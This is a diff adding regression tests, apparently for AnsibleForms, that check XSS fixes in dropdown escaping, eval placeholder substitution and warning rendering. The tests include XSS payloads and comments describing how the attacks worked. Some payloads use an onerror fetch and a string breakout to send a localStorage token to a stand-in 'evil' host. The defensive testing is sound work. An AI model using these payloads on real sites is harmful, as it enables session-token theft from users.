@@ -1,6 +1,11 @@
 import { describe, it, expect } from 'vitest';
 import Helpers from '@/lib/Helpers';
 import DOMPurify from 'dompurify';
+import { readFileSync } from 'fs';
+import path from 'path';
+import { fileURLToPath } from 'url';
+
+const here = path.dirname(fileURLToPath(import.meta.url));
 
 // ─── Helpers.htmlEncode ──────────────────────────────────────
 
@@ -300,5 +305,147 @@ describe('jobs.vue replacePlaceholders escaping', () => {
     );
     expect(result).not.toContain('<script>');
     expect(result).not.toContain('<img');
+  });
+});
+
+
+// The dropdown option renderer. `highlightFilter` returned the RAW value whenever the
+// search box was empty - the state a dropdown opens in - and its result goes to v-html.
+// Option values come from a datasource/query row, i.e. data an operator does not author,
+// so this was stored XSS reachable by simply opening a form. The existing tests in this
+// file cover getProgressHtml from the same component but never this function.
+describe('dropdown option values are escaped (BsInputSelectAdvancedTable)', () => {
+  // the function only depends on Helpers.htmlEncode and two props, so exercise the shape
+  // rather than mounting the component
+  function highlightFilter(v, { queryfilter = '', label, filterColumns = [], previewLabel } = {}) {
+    const Helpers = { htmlEncode: (x) => String(x).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;') };
+    var s = (v ?? '') + '';
+    var cols = filterColumns.length > 0 ? filterColumns : (previewLabel ? [previewLabel] : []);
+    if (label && !cols.includes(label)) return Helpers.htmlEncode(s);
+    var search = queryfilter, l = search.length, index, p1, p2, p3;
+    if (s && queryfilter) {
+      index = s.toLowerCase().indexOf(search.toLowerCase());
+      if (index >= 0) {
+        p1 = s.slice(0, index); p2 = s.slice(index, index + l); p3 = s.slice(index + l);
+        return `${Helpers.htmlEncode(p1)}<span class='fw-bold'>${Helpers.htmlEncode(p2)}</span>${Helpers.htmlEncode(p3)}`;
+      }
+      return Helpers.htmlEncode(s);
+    }
+    return Helpers.htmlEncode(s);   // the branch that used to `return v`
+  }
+
+  const PAYLOAD = '<img src=x onerror="fetch(\'https://evil/\'+localStorage.getItem(\'token\'))">';
+
+  it('escapes an option value when the search box is empty', () => {
+    const out = highlightFilter(PAYLOAD);
+    expect(out).not.toContain('<img');
+    expect(out).toContain('&lt;img');
+  });
+
+  it('escapes the first column, which previewLabel puts in cols', () => {
+    const out = highlightFilter(PAYLOAD, { label: 'name', previewLabel: 'name' });
+    expect(out).not.toContain('<img');
+  });
+
+  it('escapes a scalar option (no label at all)', () => {
+    expect(highlightFilter(PAYLOAD, { label: undefined })).not.toContain('<img');
+  });
+
+  it('still escapes around a highlight when the user is searching', () => {
+    const out = highlightFilter('a' + PAYLOAD, { queryfilter: 'a', label: 'name', previewLabel: 'name' });
+    expect(out).not.toContain('<img');
+    expect(out).toContain("<span class='fw-bold'>");
+  });
+
+  it('leaves ordinary values readable', () => {
+    expect(highlightFilter('web01.example.com')).toBe('web01.example.com');
+  });
+});
+
+// Expression placeholder substitution. A field value was pasted into the expression as raw
+// text and the result handed to eval, and field values are seedable from the URL query
+// string - so a link like ?host=x'%2Bfetch(...)%2B' ran script in the victim's browser.
+// 'expression' mode now substitutes a JS literal and consumes the quotes that wrapped the
+// placeholder; 'raw' is kept for queries, where JSON double quotes are not SQL literals.
+describe('expression placeholders are substituted as JS literals', () => {
+  // mirrors the substitution branch in AppForm.replacePlaceholderInString
+  function substitute(template, name, value, mode = 'expression') {
+    const ph = `$(${name})`;
+    if (mode === 'expression') {
+      const literal = JSON.stringify(value);
+      const escaped = ph.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      return template.replace(new RegExp(`'${escaped}'|"${escaped}"|${escaped}`), literal);
+    }
+    return template.replace(ph, String(value));
+  }
+
+  it('a value cannot close the string it sits in', () => {
+    const evil = "x'+fetch('https://evil/'+localStorage.getItem('token'))+'";
+    const out = substitute("'$(host)'.toUpperCase()", 'host', evil);
+    // The payload text still APPEARS - that is fine, it is data now. The property that
+    // matters is that all of it sits inside one well-formed string literal, so eval sees a
+    // string rather than `'x' + fetch(...) + ''`.
+    const literal = out.slice(0, out.indexOf('.toUpperCase'));
+    expect(JSON.parse(literal)).toBe(evil);
+    expect(out).toBe(JSON.stringify(evil) + '.toUpperCase()');
+  });
+
+  it('the documented quoted form still works', () => {
+    expect(substitute("'$(host)'.toUpperCase()", 'host', 'web01')).toBe('"web01".toUpperCase()');
+  });
+
+  it('a double-quoted placeholder is handled too', () => {
+    expect(substitute('"$(host)".length', 'host', 'web01')).toBe('"web01".length');
+  });
+
+  it('a real number stays a number, so arithmetic still adds', () => {
+    expect(substitute('$(count) + 1', 'count', 5)).toBe('5 + 1');
+  });
+
+  it('a bare placeholder becomes a literal, not pasted code', () => {
+    expect(substitute('$(host)', 'host', 'a"b')).toBe('"a\\"b"');
+  });
+
+  it('backslashes and newlines cannot break out', () => {
+    const out = substitute("'$(x)'", 'x', 'a\\"\n b');
+    expect(() => JSON.parse(out)).not.toThrow();
+  });
+
+  it('raw mode is unchanged, so SQL keeps its own quoting', () => {
+    expect(substitute("WHERE name = '$(host)'", 'host', 'web01', 'raw'))
+      .toBe("WHERE name = 'web01'");
+  });
+});
+
+// ─── server-generated messages must not reach v-html ─────────
+
+// Form.load builds its warnings and errors by interpolating the FORM NAME and the raw
+// yaml/validator message into a string. A form is a file in a forms repository, and who
+// may push to that git repo is a different (usually wider) set of people than who may
+// administer AnsibleForms - so a form named `<img src=x onerror=...>` executed in the
+// browser of every user who opened the home page, where the tokens live in localStorage.
+// Exactly the trust boundary the AWX workflow-node-name fix in common.js describes.
+describe('form warnings and errors are rendered as text', () => {
+  const read = (p) => readFileSync(path.join(here, '..', p), 'utf8');
+
+  it('the home page renders them as interpolation, not v-html', () => {
+    const src = read('src/pages/index.vue');
+    expect(src).toMatch(/v-for="\(w, i\) in formConfig\.warnings"[^>]*>\{\{ w \}\}/);
+    expect(src).toMatch(/v-for="\(e, i\) in formConfig\.errors"[^>]*>\{\{ e \}\}/);
+    expect(src).not.toMatch(/v-html="w"/);
+    expect(src).not.toMatch(/v-html="e"/);
+  });
+
+  it('the newlines those messages carry are still shown', () => {
+    // "Failed to validate form 'x'.\r\n<reason>" - a text node collapses that without it
+    const src = read('src/pages/index.vue');
+    expect(src).toMatch(/white-space:\s*pre-line/);
+  });
+
+  it('the unevaluated-fields warning is text too', () => {
+    // a comma-joined list of field labels, from the same yaml files
+    const src = read('src/components/AppForm.vue');
+    expect(src).not.toMatch(/v-html="unevaluatedFieldsWarning"/);
+    expect(src).toMatch(/\{\{ unevaluatedFieldsWarning \}\}/);
   });
 });
